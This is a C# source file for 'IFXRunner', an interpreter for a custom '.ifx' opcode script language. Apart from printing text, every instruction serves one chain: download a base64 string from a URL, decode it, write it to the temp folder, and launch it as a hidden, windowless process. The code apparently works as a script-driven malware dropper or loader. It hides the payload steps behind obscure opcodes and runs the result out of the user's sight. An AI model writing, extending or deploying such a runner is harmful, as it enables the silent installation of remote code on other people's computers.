using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;

class IFXRunner
{
    static Dictionary<string, string> memory = new Dictionary<string, string>();
    static Dictionary<string, byte[]> byteMemory = new Dictionary<string, byte[]>();

    static void Main(string[] args)
    {
        if (args.Length == 0)
        {
            Console.WriteLine("Usage: ifxrunner.exe <filename.ifx>");
            return;
        }

        string filePath = args[0];
        if (!File.Exists(filePath))
        {
            Console.WriteLine("File '" + filePath + "' not found.");
            return;
        }

        if (Path.GetExtension(filePath).ToLower() != ".ifx")
        {
            Console.WriteLine("Only .ifx files are supported.");
            return;
        }

        var lines = File.ReadAllLines(filePath);
        foreach (var line in lines)
        {
            string code = line.Split(';')[0].Trim();
            if (code.StartsWith("0xS"))
            {
                var match = Regex.Match(code, @"0xS (0x[0-9A-Fa-f]+) # (.+)");
                if (match.Success)
                    memory[match.Groups[1].Value] = match.Groups[2].Value;
            }
            else if (code.StartsWith("0xNET.GET"))
            {
                var match = Regex.Match(code, @"0xNET.GET (0x[0-9A-Fa-f]+) -> (0x[0-9A-Fa-f]+)");
                if (match.Success && memory.ContainsKey(match.Groups[1].Value))
                {
                    using (var client = new WebClient())
                    {
                        string url = memory[match.Groups[1].Value];
                        string result = client.DownloadString(url);
                        memory[match.Groups[2].Value] = result;
                    }
                }
            }
            else if (code.StartsWith("0xBASE64.DECODE"))
            {
                var match = Regex.Match(code, @"0xBASE64.DECODE (0x[0-9A-Fa-f]+) -> (0x[0-9A-Fa-f]+)");
                if (match.Success && memory.ContainsKey(match.Groups[1].Value))
                {
                    string b64 = memory[match.Groups[1].Value];
                    byte[] bytes = Convert.FromBase64String(b64);
                    byteMemory[match.Groups[2].Value] = bytes;
                }
            }
            else if (code.StartsWith("0xTMP.PATH"))
            {
                var match = Regex.Match(code, @"0xTMP.PATH -> (0x[0-9A-Fa-f]+)");
                if (match.Success)
                {
                    memory[match.Groups[1].Value] = Path.GetTempPath();
                }
            }
            else if (code.StartsWith("0xPATH.JOIN"))
            {
                var match = Regex.Match(code, @"0xPATH.JOIN (0x[0-9A-Fa-f]+), ""(.+?)"" -> (0x[0-9A-Fa-f]+)");
                if (match.Success && memory.ContainsKey(match.Groups[1].Value))
                {
                    string basePath = memory[match.Groups[1].Value];
                    string joined = Path.Combine(basePath, match.Groups[2].Value);
                    memory[match.Groups[3].Value] = joined;
                }
            }
            else if (code.StartsWith("0xFILE.WRITE"))
            {
                var match = Regex.Match(code, @"0xFILE.WRITE (0x[0-9A-Fa-f]+), (0x[0-9A-Fa-f]+)");
                if (match.Success &&
                    memory.ContainsKey(match.Groups[1].Value) &&
                    byteMemory.ContainsKey(match.Groups[2].Value))
                {
                    File.WriteAllBytes(memory[match.Groups[1].Value], byteMemory[match.Groups[2].Value]);
                }
            }
            else if (code.StartsWith("0xPROC.START"))
            {
                var match = Regex.Match(code, @"0xPROC.START (0x[0-9A-Fa-f]+)");
                if (match.Success && memory.ContainsKey(match.Groups[1].Value))
                {
                    var psi = new ProcessStartInfo(memory[match.Groups[1].Value])
                    {
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    Process.Start(psi);
                }
            }
            else if (code.StartsWith("0x01 # "))
            {
                Console.WriteLine(code.Substring(7));
            }
        }
    }
}
